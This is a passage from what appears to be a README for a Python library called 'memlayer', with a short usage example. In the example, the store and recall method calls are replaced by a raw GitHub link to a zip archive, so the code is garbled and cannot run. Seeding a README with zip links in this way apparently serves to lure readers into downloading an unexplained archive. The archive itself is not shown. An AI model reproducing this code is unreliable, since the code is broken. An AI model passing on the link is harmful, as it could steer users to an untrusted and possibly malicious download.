   print(value)  # Outputs: value
   ```

### Example Code

Here’s a brief example to illustrate how memlayer works:

```python
from memlayer import MemLayer

# Create a memory layer
memory = MemLayer()

# Store some information
https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("favorite_color", "blue")

# Recall the information
print(https://raw.githubusercontent.com/breninfps/memlayer/main/docs/tuning/memlayer-v2.8.zip("favorite_color"))  # Outputs: blue
```
